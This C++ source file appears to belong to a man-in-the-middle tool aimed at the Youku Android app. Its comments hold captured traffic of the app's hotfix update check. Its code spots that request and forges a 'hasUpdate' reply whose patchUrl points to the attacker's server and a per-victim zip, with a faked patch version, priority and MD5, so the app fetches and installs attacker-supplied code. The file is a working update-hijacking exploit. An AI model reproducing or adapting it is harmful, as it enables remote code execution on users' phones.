
#include "youkuhotfix.h"
#include "../cipher/CryptoUtils.h"
#include "../cipher/Base64.h"
#include "PluginServer.h"
#include "../Public.h"
#include "../attack.h"
#include "../HttpUtils.h"
#include "../cipher/Code.h"



/*
GET /gw-open/mtop.client.mudp.update.outer/1.0/?data={"patchVersion"%3A"0"%2C"updateTypes"%3A"
[\"main\"%2C\"dynamic\"%2C\"instantpatch\"%2C\"bundles\"%2C\"andfix\"%2C\"dexpatch\"]
"%2C"appVersion"%3A"7.6.8"%2C"identifier"%3A"youku_android"%2C
"brand"%3A"OPPO"%2C"dexpatchVersion"%3A"0"%2C"isYunos"%3A"false"%2C"apiLevel"%3A"23"%2C"model"%3A"OPPO+A57"} HTTP/1.1
x-appkey: 23570660
cache-control: no-cache
x-utdid: XDiZupP9ExUDAGm%2ByHZFaNag
content-type: application/x-www-form-urlencoded;charset=UTF-8
x-features: 16
x-sign: aa6666002027eb10b021ada70553f1ead1648392e3f623707d
x-t: 1552992172
x-pv: 1.0
user-agent: MTOPSDK%2F3.0.5.4+(Android%3B6.0.1%3BOPPO%3BOPPO+A57)
x-ttid: 263200
Host: acs4baichuan.m.taobao.com
Connection: Keep-Alive
Accept-Encoding: gzip

*/


/*
GET /gw-open/mtop.client.mudp.update.outer/1.0/?
data={"patchVersion"%3A"0"%2C"updateTypes"%3A"
[\"main\"%2C\"dynamic\"%2C\"instantpatch\"%2C\"bundles\"%2C\"andfix\"%2C\"dexpatch\"]
"%2C"appVersion"%3A"7.6.8"%2C"identifier"%3A"youku_android"%2C"brand"%3A"OPPO"%2C"
dexpatchVersion"%3A"0"%2C"isYunos"%3A"false"%2C"apiLevel"%3A"23"%2C"model"%3A"OPPO+A57"} HTTP/1.1
x-appkey: 23570660
cache-control: no-cache
x-utdid: XDiZupP9ExUDAGm%2ByHZFaNag
content-type: application/x-www-form-urlencoded;charset=UTF-8
x-features: 16
x-sign: aa666600202dd032f3613b780633bdb500e30ad98dd8939792
x-t: 1552992173
x-pv: 1.0
user-agent: MTOPSDK%2F3.0.5.4+(Android%3B6.0.1%3BOPPO%3BOPPO+A57)
x-ttid: 263200
Host: acs4baichuan.m.taobao.com
Connection: Keep-Alive
Accept-Encoding: gzip
*/

/*
GET /gw-open/mtop.client.mudp.update.outer/1.0/
?data=%7B%22patchVersion%22%3A%220%22%2C%22updateTypes%22%3A%22%5B%5C%22main%5C%22%2C%5C%22dynamic%5C%22%2C%5C%22
instantpatch%5C%22%2C%5C%22bundles%5C%22%2C%5C%22andfix%5C%22%2C%5C%22dexpatch%5C%22%5D%22%2C%22
appVersion%22%3A%227.6.6%22%2C%22identifier%22%3A%22youku_android%22%2C%22brand%22%3A%22OPPO%22%2C%22
dexpatchVersion%22%3A%220%22%2C%22isYunos%22%3A%22false%22%2C%22apiLevel%22%3A%2223%22%2C%22model%22%3A%22OPPO+A57%22%7D HTTP/1.1
x-appkey: 23570660
cache-control: no-cache
x-utdid: XDiZupP9ExUDAGm%2ByHZFaNag
content-type: application/x-www-form-urlencoded;charset=UTF-8
x-features: 16
x-sign: aa6666002041718b8b57ca3a88835ebbd2508866b746283ce2
x-t: 1552057358
x-pv: 1.0
user-agent: MTOPSDK%2F3.0.5.4+%28Android%3B6.0.1%3BOPPO%3BOPPO+A57%29
x-ttid: 263200
Host: acs4baichuan.m.taobao.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Date: Fri, 08 Mar 2019 15:02:40 GMT
Content-Type: application/json;charset=UTF-8
Content-Length: 473
Connection: keep-alive
s_ip: 544e624b4f50337470684b4c6768485259382b7a61724e356a6832505442773445486e6f35513d3d
s_tag: 1|0^|^^
s_tid: 0b01d2ef15520573601461233e263d
Cache-Control: no-cache
pragma: no-cache
x-node: 14eb67505d6283c8560aade252d2b8b5bd376044a12b4a1a34453fdbaf273b72
x-retcode: SUCCESS
MTOP-x-provider: 886b7aa5d11dacd583b489287fb995ec46cd1e5e5c9e5905f795fff07dfc7f19
x-bin-length: 473
X-Powered-By: m.taobao.com
Server: Tengine/Aserver/3.0.276_20180919185515
s-rt: 7

{"api":"mtop.client.mudp.update.outer","data":{"hasUpdate":"true","instantpatch":
{"patchUrl":"http://appdownload.alicdn.com/publish/youku_android/7.6.6-90365-0/7.6.6@7.6.6.ipatch",
"size":"3660","baseVersion":"7.6.6","patchVersion":"367",
"httpsUrl":"https://appdownload.alicdn.com/publish/youku_android/7.6.6-90365-0/7.6.6@7.6.6.ipatch",
"priority":"0","type":"instantpatch","beta":"false","md5":"6a526da510d9f325e60cbe40f6bfcbaa"}},"ret":["SUCCESS::调用成功"],"v":"1.0"}
*/
string gyoukuPatchVersion = "";



int YoukuHotfix::isYoukuHotfix(const char * url, const char * host) {
	if (strstr(host, "acs4baichuan.m.taobao.com") == FALSE) {
		return FALSE;
	}

	if (strstr(url, "/gw-open/mtop.client.mudp.update.outer/") )
	{
		char * versionflag = "appVersion%22%3A%22";
		char * pos = strstr((char*)url, versionflag);
		if (pos > 0)
		{
			pos += lstrlenA(versionflag);
			char *end = strstr(pos, "%");
			if (end - pos > 0 && end - pos < 16)
			{
				gyoukuPatchVersion = string(pos, end - pos);
			}
		}
		return 1;
	}

	return FALSE;
}



#define YOUKU_HOTFIX_FILENAME "youku_hotfix.zip"
int YoukuHotfix::makeRequestReply(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {

	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/json;charset=UTF-8\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;
	//string version = "9.9.9";	//7.6.6
	string patchver = "999";	//367

	string patchv = "9.0";		//1.0

	string filename = Public::getUserPluginPath(lpssl->username) + YOUKU_HOTFIX_FILENAME;

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char hdrformat[4096];
	char szformat[] = "{\"api\":\"mtop.client.mudp.update.outer\",\"data\":"
	"{\"hasUpdate\":\"true\",\"instantpatch\":"
	"{\"patchUrl\":\"http://%s/%s\","
	"\"size\":\"%u\",\"baseVersion\":\"%s\",\"patchVersion\":\"%s\","
	"\"httpUrl\":\"http://%s/%s\","
	"\"priority\":\"1\",\"type\":\"instantpatch\",\"beta\":\"false\",\"md5\":\"%s\"}},"
	"\"ret\":[\"SUCCESS::%s\"],\"v\":\"%s\"}";

	//priority must be 1

	char * chinese = "调用成功";
	char utf8[1024] = { 0 };
	ret = Code::gbk2utf8(chinese, lstrlenA(chinese), utf8, 1024);
	int httphdrlen = sprintf_s(hdrformat, 4096, szformat,
		strip.c_str(), YOUKU_HOTFIX_FILENAME,filesize, gyoukuPatchVersion.c_str(),patchver.c_str(),
		strip.c_str(), YOUKU_HOTFIX_FILENAME,szmd5, utf8,patchv.c_str());

	int retlen = sprintf(dstbuf, szHttpPartialZipFormat, httphdrlen, hdrformat);

	char szout[4096];
	int outlen = sprintf_s(szout, 4096, "youhotfix reply:%s\r\n", dstbuf);
	Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	return retlen;
}



/*
GET /bundle/14e7d8adb5fbfed9909ec72ebf156b9e/libaurora.so HTTP/1.1
Range: bytes=0-
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: appdownload.youku.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 206 Partial Content
Server: Tengine
Content-Type: application/octet-stream
Content-Length: 1268044
Connection: keep-alive
Date: Tue, 19 Mar 2019 10:42:41 GMT
x-oss-request-id: 5C90C7A1005B44F1DB463555
Accept-Ranges: bytes
ETag: "3F2570DDC77637EB34736AC651CDCBC9"
Last-Modified: Tue, 19 Mar 2019 10:40:31 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 18055339226351215359
x-oss-storage-class: Standard
Content-MD5: PyVw3cd2N+s0c2rGUc3LyQ==
x-oss-server-time: 3
Via: cache30.l2cm9[0,304-0,H], cache45.l2cm9[1,0], cache2.cn623[0,206-0,H], cache12.cn623[1,0]
Ali-Swift-Global-Savetime: 1552991187
Age: 14
X-Cache: HIT TCP_MEM_HIT dirn:-2:-2
X-Swift-SaveTime: Tue, 19 Mar 2019 10:42:52 GMT
X-Swift-CacheTime: 14
Content-Range: bytes 0-1268043/1268044
Access-Control-Allow-Origin: *
Timing-Allow-Origin: *
EagleId: 7250c52015529921755197134e

ELF
*/

/*
GET /bundle/3f2570ddc77637eb34736ac651cdcbc9/libgcanvas.so HTTP/1.1
Range: bytes=0-
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: appdownload.youku.com
Connection: Keep-Alive
Accept-Encoding: gzip

GET /bundle/2f60ae059c05abcd8e8b9790074f6732/libadoplayer_external_irdetodrm_wrapper.so HTTP/1.1
Range: bytes=0-
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: appdownload.youku.com
Connection: Keep-Alive
Accept-Encoding: gzip


*/